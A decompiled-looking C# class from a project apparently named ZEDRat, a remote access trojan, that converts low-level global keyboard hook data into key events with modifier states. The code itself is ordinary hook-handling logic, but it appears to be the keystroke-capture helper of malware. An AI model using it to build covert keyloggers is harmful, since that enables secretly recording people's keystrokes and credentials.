using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook
{
	public class KeyEventArgsExt : KeyEventArgs
	{
		public int Timestamp { get; private set; }

		public bool IsKeyDown { get; private set; }

		public bool IsKeyUp { get; private set; }

		public KeyEventArgsExt(Keys keyData)
			: base(keyData)
		{
		}

		internal KeyEventArgsExt(Keys keyData, int timestamp, bool isKeyDown, bool isKeyUp)
			: this(keyData)
		{
			this.Timestamp = timestamp;
			this.IsKeyDown = isKeyDown;
			this.IsKeyUp = isKeyUp;
		}

		internal static KeyEventArgsExt FromRawDataApp(CallbackData data)
		{
			IntPtr wParam = data.WParam;
			IntPtr lParam = data.LParam;
			int tickCount = Environment.TickCount;
			int num = (int)lParam.ToInt64();
			bool flag = (num & 0x40000000) != 0;
			bool flag2 = (num & int.MinValue) != 0;
			return new KeyEventArgsExt(KeyEventArgsExt.AppendModifierStates((Keys)(int)wParam), tickCount, !flag && !flag2, flag && flag2);
		}

		internal static KeyEventArgsExt FromRawDataGlobal(CallbackData data)
		{
			IntPtr wParam = data.WParam;
			KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(data.LParam, typeof(KeyboardHookStruct));
			Keys keys = KeyEventArgsExt.AppendModifierStates((Keys)keyboardHookStruct.VirtualKeyCode);
			int num = (int)wParam;
			return new KeyEventArgsExt(keys, keyboardHookStruct.Time, num == 256 || num == 260, num == 257 || num == 261);
		}

		private static bool CheckModifier(int vKey)
		{
			return (KeyboardNativeMethods.GetKeyState(vKey) & 0x8000) > 0;
		}

		private static Keys AppendModifierStates(Keys keyData)
		{
			bool flag = KeyEventArgsExt.CheckModifier(17);
			bool flag2 = KeyEventArgsExt.CheckModifier(16);
			bool flag3 = KeyEventArgsExt.CheckModifier(18);
			return keyData | (flag ? Keys.Control : Keys.None) | (flag2 ? Keys.Shift : Keys.None) | (flag3 ? Keys.Alt : Keys.None);
		}
	}
}
